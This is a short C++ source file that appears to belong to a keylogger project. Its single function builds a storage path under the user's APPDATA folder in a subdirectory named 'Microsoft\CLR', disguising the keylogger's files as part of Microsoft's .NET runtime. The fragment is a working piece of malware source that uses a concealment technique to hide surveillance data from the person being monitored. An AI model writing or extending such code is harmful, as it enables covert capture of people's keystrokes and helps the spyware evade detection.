#include "KeyloggerDirectoryLocator.h"

namespace keylogger
{
std::string KeyloggerDirectoryLocator::getAppDataKeyloggerPath(bool appendSeparator)
{
    std::string appDataDirectory{ getenv("APPDATA") };
    std::string appDataPath = appDataDirectory + "\\Microsoft\\CLR";
    return appDataPath + (appendSeparator ? "\\" : "");
}
}
